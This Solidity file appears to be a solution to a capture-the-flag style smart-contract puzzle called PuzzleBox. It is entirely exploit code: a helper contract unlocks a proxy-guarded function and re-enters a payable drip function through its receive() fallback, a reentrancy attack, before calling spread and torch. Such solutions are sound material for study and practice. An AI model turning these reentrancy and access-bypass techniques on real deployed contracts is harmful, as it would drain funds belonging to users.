pragma solidity ^0.8.19;

import "./PuzzleBox.sol";

contract PuzzleBoxSolution {
    function solve(PuzzleBox puzzle) external {
        // How close can you get to opening the box?
        Operate operate = new Operate(puzzle);
        operate.callDrip();

        address payable[] memory friends = new address payable[](2);
        uint256[] memory friendsCutBps = new uint256[](2);
        friends[0] = payable(0x416e59DaCfDb5D457304115bBFb9089531D873B7);
        friends[1] = payable(0xC817dD2a5daA8f790677e399170c92AabD044b57);
        friendsCutBps[0] = 0.015e4;
        friendsCutBps[1] = 0.0075e4;
        puzzle.spread(friends, friendsCutBps);

        uint256[] memory inputArray = new uint256[](5);
        inputArray[0] = 2;
        inputArray[1] = 4;
        inputArray[2] = 6;
        inputArray[3] = 7;
        inputArray[4] = 8;
        bytes memory encodedDripIds = abi.encode(inputArray);
        puzzle.torch(encodedDripIds);
    }
}

interface IPBProxy {
    function lock(bytes4, bool) external;
}

contract Operate {
    PuzzleBox puzzle;
    uint256 counter;
    constructor(PuzzleBox _puzzle) payable {
        puzzle = _puzzle;
        puzzle.operate();
        IPBProxy(address(puzzle)).lock(bytes4(keccak256("torch(bytes)")), false);
    }

    function callDrip() external {
        puzzle.drip{value: puzzle.dripFee() + 1}();
    }

    receive() external payable {
        if(counter < 9) {
            ++counter;
            puzzle.drip{value: puzzle.dripFee() + 1}();
        }
    }
}